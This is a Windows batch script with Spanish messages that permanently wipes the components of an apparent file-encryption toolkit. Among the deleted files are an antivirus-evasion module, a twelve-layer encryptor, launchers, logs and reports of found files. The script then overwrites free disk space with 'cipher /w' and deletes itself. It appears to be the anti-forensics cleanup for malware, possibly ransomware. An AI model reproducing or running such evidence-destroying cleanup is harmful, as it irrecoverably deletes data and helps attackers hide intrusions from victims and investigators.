@echo off
title LIMPIEZA TOTAL DEL SISTEMA
color 0C
echo.
echo ===================================================================
echo                     LIMPIEZA TOTAL DEL SISTEMA
echo ===================================================================
echo.
echo ADVERTENCIA: Este proceso eliminara PERMANENTEMENTE todos los
echo archivos del sistema de encriptacion y NO podran ser recuperados.
echo.
echo ===================================================================
echo.
pause

echo.
echo Iniciando eliminacion permanente...
echo.

REM Eliminar archivos Python
del /F /Q index.py 2>nul
del /F /Q rutas.py 2>nul
del /F /Q acciones.py 2>nul
del /F /Q encriptador_12_capas.py 2>nul
del /F /Q evasion_av.py 2>nul
del /F /Q launcher.py 2>nul
del /F /Q launcher.bat 2>nul
del /F /Q launcher.sh 2>nul
del /F /Q comprimir.py 2>nul

REM Eliminar reportes
del /F /Q reporte_*.txt 2>nul
del /F /Q archivos_encontrados.txt 2>nul
del /F /Q encryption_debug.log 2>nul
del /F /Q progreso_*.txt 2>nul
del /F /Q error.txt 2>nul

REM Eliminar imagenes
del /F /Q imagen_sin.jpg 2>nul
del /F /Q ADMINISTRADOR.jpg 2>nul

REM Eliminar carpeta python_portable
if exist python_portable (
    echo Eliminando python_portable...
    rmdir /S /Q python_portable 2>nul
)

REM Sobrescribir espacio libre
echo Sobrescribiendo espacio libre...
cipher /w:%CD% >nul 2>&1

echo.
echo ===================================================================
echo                   LIMPIEZA COMPLETADA
echo ===================================================================
echo.
echo Todos los archivos han sido eliminados permanentemente.
echo Solo queda este archivo: limpieza.bat
echo.
echo Puedes eliminarlo manualmente o ejecutarlo de nuevo.
echo.
pause

REM Auto-eliminar este batch
(goto) 2>nul & del "%~f0"
